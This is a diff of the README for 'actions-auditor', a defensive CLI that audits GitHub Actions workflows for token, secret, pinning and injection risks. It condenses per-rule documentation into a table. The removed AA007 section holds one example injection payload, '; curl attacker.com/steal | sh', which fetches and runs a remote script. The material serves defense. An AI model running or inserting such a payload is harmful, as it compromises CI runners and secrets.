@@ -1,547 +1,207 @@
 # actions-auditor
 
-A CLI security tool that scans GitHub Actions workflow YAML files for common misconfigurations and vulnerabilities. It produces a prioritized, color-coded risk report with concrete remediation guidance and can be integrated as a pre-commit hook or run standalone in CI pipelines.
+> Audit your GitHub Actions before attackers do.
 
----
-
-## Table of Contents
-
-- [Features](#features)
-- [Installation](#installation)
-- [Quick Start](#quick-start)
-- [Usage](#usage)
-  - [Scan Command](#scan-command)
-  - [Options Reference](#options-reference)
-- [Security Rules](#security-rules)
-  - [AA001 – Overly Permissive GITHUB\_TOKEN](#aa001--overly-permissive-github_token)
-  - [AA002 – Missing Permissions Declaration](#aa002--missing-permissions-declaration)
-  - [AA003 – Secret Exposed in Environment Variable](#aa003--secret-exposed-in-environment-variable)
-  - [AA004 – Secret Interpolated in Run Script](#aa004--secret-interpolated-in-run-script)
-  - [AA005 – Unpinned Third-Party Action](#aa005--unpinned-third-party-action)
-  - [AA006 – pull\_request\_target with Head Checkout](#aa006--pull_request_target-with-head-checkout)
-  - [AA007 – Script Injection via Untrusted Context](#aa007--script-injection-via-untrusted-context)
-  - [AA008 – workflow\_dispatch Input in Run Script](#aa008--workflow_dispatch-input-in-run-script)
-- [Pre-commit Integration](#pre-commit-integration)
-- [CI/CD Integration](#cicd-integration)
-- [Example Output](#example-output)
-- [Development](#development)
-- [License](#license)
-
----
-
-## Features
-
-- **Overly broad GITHUB_TOKEN permissions** – Detects `write-all` or missing least-privilege scope declarations and flags them as high severity.
-- **Exposed secrets** – Identifies secrets exposed via `env` blocks or interpolated directly into `run` scripts where they can leak in logs.
-- **Unpinned third-party actions** – Flags actions not pinned to a full commit SHA, preventing supply-chain attacks via mutable tags.
-- **Dangerous pull_request_target patterns** – Detects `pull_request_target` triggers combined with code checkout of the PR head — the exact vector behind major CI/CD breaches.
-- **Script injection risks** – Detects user-controlled GitHub context values (`github.event.pull_request.title`, `github.event.issue.body`, etc.) interpolated directly into shell commands.
-- **workflow_dispatch injection** – Flags `${{ inputs.* }}` values embedded directly in `run` scripts.
-- **Prioritized color-coded report** – Findings are sorted by severity (CRITICAL → HIGH → MEDIUM → LOW → INFO) with rule IDs, file/line references, and actionable remediation steps.
-- **CI gating** – Exits with status `1` when findings are detected, enabling pipeline blocking.
-- **Pre-commit hook** – Drop-in support for [pre-commit](https://pre-commit.com/).
-
----
-
-## Installation
-
-### From PyPI (recommended)
-
-```bash
-pip install actions-auditor
-```
-
-### From source
-
-```bash
-git clone https://github.com/example/actions-auditor.git
-cd actions-auditor
-pip install -e .
-```
-
-### Development installation
-
-```bash
-pip install -e ".[dev]"
-```
+`actions-auditor` is a CLI security tool that scans GitHub Actions workflow YAML files for common misconfigurations and vulnerabilities. It produces a prioritized, color-coded risk report with concrete remediation guidance and exits with a non-zero status code so you can gate your CI pipelines on security findings.
 
 ---
 
 ## Quick Start
 
 ```bash
-# Scan the default .github/workflows/ directory in the current repo
+# Install from PyPI
+pip install actions-auditor
+
+# Scan the default .github/workflows/ directory
 actions-auditor scan
 
-# Scan a specific repository root
-actions-auditor scan /path/to/my-repo
+# Scan a specific directory or file
+actions-auditor scan path/to/workflows/
 
-# Verbose output with remediation guidance
-actions-auditor scan --verbose
-
-# Only report HIGH and CRITICAL findings
+# Fail only on HIGH severity and above
 actions-auditor scan --min-severity HIGH
-
-# CI-friendly: no colour, non-zero exit on findings
-actions-auditor scan --no-color
 ```
+
+That's it. A color-coded report prints to your terminal, and the process exits with code `1` if any findings are detected.
 
 ---
 
-## Usage
+## What It Does
 
-### Scan Command
+`actions-auditor` parses your GitHub Actions workflow YAML files and runs a suite of security rules against them — catching issues like overly broad token permissions, exposed secrets, unpinned third-party actions, and dangerous trigger patterns. Each finding is tagged with a severity level, a file and line reference, and a concrete remediation step so you know exactly what to fix and why.
+
+---
+
+## Features
+
+- **Token permission auditing** — Detects `permissions: write-all` and missing least-privilege scope declarations (AA001, AA002)
+- **Secret exposure detection** — Finds secrets leaked via `env` blocks, `run` scripts, or `workflow_dispatch` inputs that could appear in logs (AA003, AA004, AA008)
+- **Supply-chain attack prevention** — Flags third-party Actions not pinned to a full 40-character commit SHA (AA005)
+- **Dangerous trigger detection** — Identifies `pull_request_target` combined with a PR head checkout — the exact vector behind major CI/CD breaches (AA006)
+- **Script injection detection** — Catches untrusted GitHub context values interpolated directly into `run` scripts (AA007)
+- **CI/CD gating** — Exits with a non-zero status on findings; integrates as a pre-commit hook or standalone pipeline step
+
+---
+
+## Usage Examples
+
+### Standalone CLI
+
+```bash
+# Scan default workflow directory
+actions-auditor scan
+
+# Scan a custom path
+actions-auditor scan .github/workflows/deploy.yml
+
+# Filter to CRITICAL and HIGH only
+actions-auditor scan --min-severity HIGH
+
+# Output in JSON format (for downstream processing)
+actions-auditor scan --format json
+
+# Suppress color output (e.g. in CI logs)
+actions-auditor scan --no-color
+```
+
+### Example Report Output
 
 ```
-usage: actions-auditor scan [PATH] [OPTIONS]
+╔══════════════════════════════════════════════════════╗
+║         actions-auditor  v0.1.0  Security Report     ║
+╚══════════════════════════════════════════════════════╝
+
+🔴 CRITICAL  AA006  deploy.yml:14
+  pull_request_target trigger with head-ref checkout detected.
+  → Use pull_request instead, or never check out untrusted code
+    in a pull_request_target workflow.
+    Ref: https://securitylab.github.com/research/github-actions-preventing-pwn-requests/
+
+🟠 HIGH      AA001  ci.yml:3
+  permissions: write-all grants excessive GITHUB_TOKEN scope.
+  → Declare explicit, minimal scopes (e.g. contents: read).
+    Ref: https://docs.github.com/en/actions/security-guides/automatic-token-authentication
+
+🟡 MEDIUM    AA005  ci.yml:22
+  Third-party action 'actions/checkout@v3' is not pinned to a commit SHA.
+  → Pin to a full SHA: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
+    Ref: https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
+
+──────────────────────────────────────────────────────
+Summary: 3 findings  [CRITICAL: 1 | HIGH: 1 | MEDIUM: 1]
 ```
 
-`PATH` is the root directory of the repository to scan. The tool searches `<PATH>/.github/workflows/` for YAML files. Defaults to the current working directory.
+### As a Pre-commit Hook
 
-### Options Reference
+Add to your `.pre-commit-config.yaml`:
 
-| Option | Description |
-|---|---|
-| `PATH` | Repository root directory (default: current directory) |
-| `--files FILE [FILE ...]` | Scan specific workflow files instead of discovering them |
-| `--workflows-dir DIR` | Override the workflows sub-directory (default: `.github/workflows`) |
-| `-v`, `--verbose` | Show detailed per-finding panels with descriptions and remediation |
-| `--no-remediation` | Suppress remediation panels (only effective with `--verbose`) |
-| `--summary-only` | Print only the summary panel, suppress per-severity tables |
-| `--show-files` | Include the list of scanned files in the summary panel |
-| `--min-severity LEVEL` | Minimum severity to report: `CRITICAL`, `HIGH`, `MEDIUM`, `LOW`, `INFO` (default: `INFO`) |
-| `--no-color` | Disable ANSI colour output |
-| `--exit-zero` | Always exit with status `0` (warning-only CI step) |
-| `--follow-symlinks` | Follow symbolic links during directory traversal |
-| `--debug` | Enable debug logging to stderr |
-| `--version` | Show version and exit |
+```yaml
+repos:
+  - repo: https://github.com/example/actions-auditor
+    rev: v0.1.0
+    hooks:
+      - id: actions-auditor
+```
+
+The hook automatically scans staged workflow files and blocks the commit if any security issues are found.
 
 ---
 
 ## Security Rules
 
-### AA001 – Overly Permissive GITHUB_TOKEN
-
-**Severity:** HIGH / MEDIUM
-
-Detects `permissions: write-all` at the top-level or job-level, and individual scopes set to `write` at the job level.
-
-**Why it matters:** Granting `write-all` gives every job in the workflow unrestricted write access to all repository resources (code, issues, packages, secrets). If any step executes attacker-controlled code, the token can be used to push malicious commits or exfiltrate secrets.
-
-**Remediation:** Replace `permissions: write-all` with an explicit, least-privilege permissions block:
-
-```yaml
-# Bad
-permissions: write-all
-
-# Good
-permissions:
-  contents: read
-  pull-requests: write
-```
-
-**References:**
-- https://docs.github.com/en/actions/security-guides/automatic-token-authentication#modifying-the-permissions-for-the-github_token
+| Rule ID | Severity | Description |
+|---------|----------|-------------|
+| AA001 | HIGH | `permissions: write-all` or overly broad GITHUB_TOKEN scope |
+| AA002 | MEDIUM | Missing top-level `permissions` declaration |
+| AA003 | HIGH | Secret exposed in `env` block |
+| AA004 | HIGH | Secret interpolated directly in `run` script |
+| AA005 | MEDIUM | Third-party action not pinned to a full commit SHA |
+| AA006 | CRITICAL | `pull_request_target` trigger with PR head checkout |
+| AA007 | HIGH | Script injection from untrusted GitHub context values |
+| AA008 | HIGH | `workflow_dispatch` input interpolated in `run` script |
 
 ---
 
-### AA002 – Missing Permissions Declaration
+## Project Structure
 
-**Severity:** MEDIUM
-
-Detects workflows that omit a top-level `permissions` block entirely.
-
-**Why it matters:** Without an explicit `permissions` key, the GITHUB_TOKEN inherits the repository's default permissions, which may include broad write access depending on organisation settings.
-
-**Remediation:** Add a top-level `permissions` block with the minimum required scopes:
-
-```yaml
-permissions:
-  contents: read
 ```
-
-**References:**
-- https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token
-
----
-
-### AA003 – Secret Exposed in Environment Variable
-
-**Severity:** HIGH (top-level env) / MEDIUM (job-level env)
-
-Detects `${{ secrets.* }}` expressions in top-level or job-level `env` blocks. Secrets at the step level are acceptable and not flagged.
-
-**Why it matters:** Secrets exposed as environment variables are accessible to all commands in a job, including third-party actions that may log or exfiltrate them.
-
-**Remediation:** Scope secrets to the individual step that needs them:
-
-```yaml
-# Bad
-jobs:
-  build:
-    env:
-      API_KEY: ${{ secrets.API_KEY }}  # accessible to ALL steps
-
-# Good
-jobs:
-  build:
-    steps:
-      - name: Call API
-        run: curl -H "Authorization: $API_KEY" https://api.example.com
-        env:
-          API_KEY: ${{ secrets.API_KEY }}  # limited to this step
+actions-auditor/
+├── actions_auditor/
+│   ├── __init__.py        # Package init, version, public API
+│   ├── cli.py             # CLI entry point and argument parsing
+│   ├── scanner.py         # Workflow file discovery and YAML loading
+│   ├── rules.py           # Security rule checker functions
+│   ├── models.py          # Finding, Severity, ScanResult dataclasses
+│   ├── reporter.py        # Color-coded terminal report rendering
+│   └── remediation.py     # Rule ID → remediation advice registry
+├── tests/
+│   ├── __init__.py
+│   ├── test_rules.py      # Unit tests for each security rule
+│   ├── test_scanner.py    # Tests for file discovery and YAML parsing
+│   ├── test_models.py     # Tests for core data models
+│   ├── test_reporter.py   # Tests for report rendering
+│   ├── test_remediation.py
+│   └── fixtures/
+│       ├── good_workflow.yml  # Negative test case (zero findings)
+│       └── bad_workflow.yml   # Positive test case (all violations)
+├── .pre-commit-hooks.yaml
+├── pyproject.toml
+└── README.md
 ```
 
 ---
 
-### AA004 – Secret Interpolated in Run Script
+## Configuration
 
-**Severity:** HIGH
+`actions-auditor` is configured via CLI flags. No config file is required.
 
-Detects `${{ secrets.* }}` expressions embedded directly in `run` step scripts.
+| Flag | Default | Description |
+|------|---------|-------------|
+| `PATH` | `.github/workflows/` | Directory or file to scan |
+| `--min-severity` | `INFO` | Minimum severity to report (`INFO`, `LOW`, `MEDIUM`, `HIGH`, `CRITICAL`) |
+| `--format` | `terminal` | Output format: `terminal` or `json` |
+| `--no-color` | `False` | Disable color output |
+| `--no-remediation` | `False` | Omit remediation advice from output |
+| `--exit-zero` | `False` | Always exit 0, even when findings are detected |
 
-**Why it matters:** Secrets interpolated into shell commands are substituted before execution, causing them to appear in error messages, debug output, and potentially in Actions logs if log-masking fails.
-
-**Remediation:** Pass the secret via a step-level environment variable:
-
-```yaml
-# Bad
-- run: curl -u ${{ secrets.TOKEN }} https://api.example.com
-
-# Good
-- run: curl -u "$MY_TOKEN" https://api.example.com
-  env:
-    MY_TOKEN: ${{ secrets.TOKEN }}
-```
-
----
-
-### AA005 – Unpinned Third-Party Action
-
-**Severity:** HIGH
-
-Detects `uses:` references where the `@<ref>` part is not a full 40-character hexadecimal commit SHA. Local actions (`./`) and Docker images (`docker://`) are exempt.
-
-**Why it matters:** Referencing an action by a mutable tag (e.g., `@v3`, `@main`) allows the action's author — or an attacker who has compromised that repository — to silently change the code that executes in your workflow.
-
-**Remediation:** Pin every third-party action to a specific commit SHA:
+### CI Pipeline Integration
 
 ```yaml
-# Bad
-- uses: actions/checkout@v4
-
-# Good
-- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
-```
-
-Use [Dependabot](https://docs.github.com/en/code-security/dependabot/working-with-dependabot/keeping-your-actions-up-to-date-with-dependabot) or [pin-github-action](https://github.com/mheap/pin-github-action) to keep pinned SHAs up to date automatically.
-
-**References:**
-- https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-third-party-actions
-
----
-
-### AA006 – pull_request_target with Head Checkout
-
-**Severity:** CRITICAL
-
-Detects the combination of a `pull_request_target` trigger with a checkout of the PR head ref (`github.event.pull_request.head.sha`, `github.event.pull_request.head.ref`, or `github.head_ref`).
-
-**Why it matters:** The `pull_request_target` trigger runs in the context of the *base* repository with a write-capable GITHUB_TOKEN and access to secrets. Checking out the PR head executes attacker-controlled code in this privileged context. This pattern was the root cause of several high-profile CI/CD supply-chain breaches in 2021.
-
-**Remediation:** Never check out the PR head in a `pull_request_target` workflow. Use the `pull_request` trigger instead (which has restricted token permissions and no secret access for fork PRs):
-
-```yaml
-# Bad
-on: pull_request_target
-jobs:
-  build:
-    steps:
-      - uses: actions/checkout@v4
-        with:
-          ref: ${{ github.event.pull_request.head.sha }}  # attacker code!
-
-# Good
-on: pull_request
-jobs:
-  build:
-    steps:
-      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
-```
-
-**References:**
-- https://securitylab.github.com/research/github-actions-preventing-pwn-requests/
-- https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target
-
----
-
-### AA007 – Script Injection via Untrusted Context
-
-**Severity:** CRITICAL
-
-Detects user-controlled GitHub context values (such as `github.event.pull_request.title`, `github.event.issue.body`, `github.event.comment.body`, `github.head_ref`, etc.) interpolated directly into `run` scripts.
-
-**Why it matters:** An attacker can craft a PR title, issue body, or commit message containing shell metacharacters (e.g., `; curl attacker.com/steal | sh`) to execute arbitrary commands in the context of the runner.
-
-**Remediation:** Pass the context value through a step-level environment variable:
-
-```yaml
-# Bad
-- run: echo "PR title: ${{ github.event.pull_request.title }}"
-
-# Good
-- run: echo "PR title: $PR_TITLE"
-  env:
-    PR_TITLE: ${{ github.event.pull_request.title }}
-```
-
-**References:**
-- https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections
-- https://securitylab.github.com/research/github-actions-untrusted-input/
-
----
-
-### AA008 – workflow_dispatch Input in Run Script
-
-**Severity:** HIGH
-
-Detects `${{ inputs.* }}` expressions from `workflow_dispatch` triggers embedded directly in `run` scripts.
-
-**Why it matters:** Anyone with permission to trigger the workflow (manually or via the API) can supply a malicious input value containing shell metacharacters.
-
-**Remediation:** Use an environment variable intermediary:
-
-```yaml
-# Bad
-- run: deploy.sh ${{ inputs.environment }}
-
-# Good
-- run: deploy.sh "$DEPLOY_ENV"
-  env:
-    DEPLOY_ENV: ${{ inputs.environment }}
-```
-
----
-
-## Pre-commit Integration
-
-Add `actions-auditor` to your `.pre-commit-config.yaml` to automatically scan workflow files before each commit:
-
-```yaml
-repos:
-  - repo: https://github.com/example/actions-auditor
-    rev: v0.1.0
-    hooks:
-      - id: actions-auditor
-```
-
-The hook will scan any staged GitHub Actions workflow files matching `^.github/workflows/.*\.ya?ml$` and block the commit if security issues are found.
-
-To install and run the hook:
-
-```bash
-pip install pre-commit
-pre-commit install
-pre-commit run actions-auditor --all-files
-```
-
-### Hook Configuration
-
-You can pass additional arguments to the hook via the `args` key:
-
-```yaml
-repos:
-  - repo: https://github.com/example/actions-auditor
-    rev: v0.1.0
-    hooks:
-      - id: actions-auditor
-        args:
-          - scan
-          - --min-severity
-          - HIGH
-          - --no-color
-```
-
----
-
-## CI/CD Integration
-
-### GitHub Actions
-
-Add a security audit step to your CI workflow:
-
-```yaml
+# .github/workflows/audit.yml
 name: Security Audit
-
-on:
-  push:
-    paths:
-      - '.github/workflows/**'
-  pull_request:
-    paths:
-      - '.github/workflows/**'
-
-permissions:
-  contents: read
+on: [push, pull_request]
 
 jobs:
   audit:
-    name: Audit Workflow Files
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout repository
-        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
-
-      - name: Set up Python
-        uses: actions/setup-python@0b93645e9fea7318ecaed2b359559ac225c90a2b  # v5.3.0
-        with:
-          python-version: "3.11"
-
-      - name: Install actions-auditor
-        run: pip install actions-auditor
-
-      - name: Scan workflow files
-        run: actions-auditor scan --no-color --min-severity MEDIUM
-```
-
-### Exit Codes
-
-| Code | Meaning |
-|------|----------|
-| `0`  | No findings detected (or `--exit-zero` was passed) |
-| `1`  | One or more security findings detected |
-| `2`  | Operational error (e.g., directory not found) |
-
-### Warning-only mode
-
-If you want to audit without blocking the pipeline:
-
-```bash
-actions-auditor scan --exit-zero
+      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
+      - run: pip install actions-auditor
+      - run: actions-auditor scan --min-severity MEDIUM
 ```
 
 ---
 
-## Example Output
+## Installation
 
-```
-────────────────── :shield: GitHub Actions Security Audit Report :shield: ──────────────────
-
-──────────────────────────── :rotating_light: Critical (2 findings) ────────────────────────────
-
-╭───────┬─────────────────────────────────┬─────────────────────────────────┬──────────────────────────╮
-│ Rule  │ Location                        │ Title                           │ Evidence                 │
-├───────┼─────────────────────────────────┼─────────────────────────────────┼──────────────────────────┤
-│ AA006 │ bad_workflow.yml:55             │ pull_request_target with        │ on: pull_request_target  │
-│       │ (job: vulnerable_job,           │ head-ref checkout               │ + github.event.pull_     │
-│       │  step: Checkout attacker-       │                                 │ request.head.sha         │
-│       │  controlled PR code)            │                                 │                          │
-├───────┼─────────────────────────────────┼─────────────────────────────────┼──────────────────────────┤
-│ AA007 │ bad_workflow.yml:72             │ Potential script injection via  │ ${{ github.event.pull_   │
-│       │ (job: vulnerable_job,           │ untrusted GitHub context        │ request.title }}         │
-│       │  step: Process pull request     │                                 │                          │
-│       │  title)                         │                                 │                          │
-╰───────┴─────────────────────────────────┴─────────────────────────────────┴──────────────────────────╯
-
-──────────────────────────────── :red_circle: High (5 findings) ────────────────────────────────
-
-╭───────┬──────────────────────────────┬───────────────────────────────────────┬───────────────────────╮
-│ Rule  │ Location                     │ Title                                 │ Evidence              │
-├───────┼──────────────────────────────┼───────────────────────────────────────┼───────────────────────┤
-│ AA001 │ bad_workflow.yml:30          │ Overly permissive GITHUB_TOKEN        │ permissions: write-   │
-│       │                              │ (write-all)                           │ all                   │
-├───────┼──────────────────────────────┼───────────────────────────────────────┼───────────────────────┤
-│ AA003 │ bad_workflow.yml:36          │ Secret exposed in top-level env       │ API_SECRET: ${{       │
-│       │                              │ variable 'API_SECRET'                 │ secrets.API_SECRET }} │
-├───────┼──────────────────────────────┼───────────────────────────────────────┼───────────────────────┤
-│ AA004 │ bad_workflow.yml:66          │ Secret directly interpolated in run   │ ${{ secrets.          │
-│       │ (job: vulnerable_job,        │ script                                │ API_SECRET }}         │
-│       │  step: Authenticate using    │                                       │                       │
-│       │  secret in run script)       │                                       │                       │
-├───────┼──────────────────────────────┼───────────────────────────────────────┼───────────────────────┤
-│ AA005 │ bad_workflow.yml:57          │ Unpinned action:                      │ uses: actions/        │
-│       │ (job: vulnerable_job,        │ actions/checkout@v4                   │ checkout@v4           │
-│       │  step: Checkout attacker-    │                                       │                       │
-│       │  controlled PR code)         │                                       │                       │
-│ AA008 │ bad_workflow.yml:82          │ workflow_dispatch input interpolated  │ ${{ inputs.           │
-│       │ (job: vulnerable_job,        │ in run script                         │ deploy_env }}         │
-│       │  step: Deploy to environment)│                                       │                       │
-╰───────┴──────────────────────────────┴───────────────────────────────────────┴───────────────────────╯
-
-╭─────────────────────────────── Scan Summary ────────────────────────────────╮
-│ Files scanned:   1                                                          │
-│ Total findings:  9                                                          │
-│                                                                             │
-│ Findings by severity:                                                       │
-│   :rotating_light:  Critical     2                                          │
-│   :red_circle:      High         5                                          │
-│   :yellow_circle:   Medium       2                                          │
-│   :blue_circle:     Low          0                                          │
-│   :white_circle:    Info         0                                          │
-│                                                                             │
-│ :cross_mark: 9 finding(s) detected. Review and remediate before merging.   │
-╰─────────────────────────────────────────────────────────────────────────────╯
-```
-
----
-
-## Development
-
-### Running Tests
+**Requirements:** Python 3.9+
 
 ```bash
-# Install development dependencies
-pip install -e ".[dev]"
+# From PyPI
+pip install actions-auditor
 
-# Run all tests
-pytest
-
-# Run with coverage
-pytest --cov=actions_auditor --cov-report=term-missing
-
-# Run a specific test file
-pytest tests/test_rules.py -v
-
-# Run a specific test class
-pytest tests/test_rules.py::TestCheckUnpinnedActions -v
+# From source
+git clone https://github.com/example/actions-auditor
+cd actions-auditor
+pip install -e .
 ```
-
-### Project Structure
-
-```
-actions_auditor/
-├── __init__.py          # Package init, version
-├── cli.py               # CLI entry point (argparse)
-├── models.py            # Severity, Finding, ScanResult dataclasses
-├── rules.py             # Security rule checker functions
-├── scanner.py           # Workflow file discovery and loading
-├── reporter.py          # Rich terminal report renderer
-└── remediation.py       # Rule ID → remediation advice registry
-
-tests/
-├── fixtures/
-│   ├── good_workflow.yml  # Well-configured workflow (negative test case)
-│   └── bad_workflow.yml   # Misconfigured workflow (positive test case)
-├── test_models.py
-├── test_rules.py
-├── test_scanner.py
-├── test_reporter.py
-└── test_remediation.py
-```
-
-### Adding a New Rule
-
-1. Add a checker function to `actions_auditor/rules.py` following the pattern:
-   ```python
-   def check_my_new_rule(workflow: WorkflowFile) -> List[Finding]:
-       ...
-   ```
-2. Register it in the `ALL_RULES` list at the bottom of `rules.py`.
-3. Add a `RemediationAdvice` entry to `REMEDIATION_REGISTRY` in `actions_auditor/remediation.py`.
-4. Add unit tests in `tests/test_rules.py`.
 
 ---
 
 ## License
 
-MIT License. See [LICENSE](LICENSE) for details.
+MIT — see [LICENSE](LICENSE) for details.
+
+---
+
+*Built with [Jitter](https://github.com/jitter-ai) - an AI agent that ships code daily.*
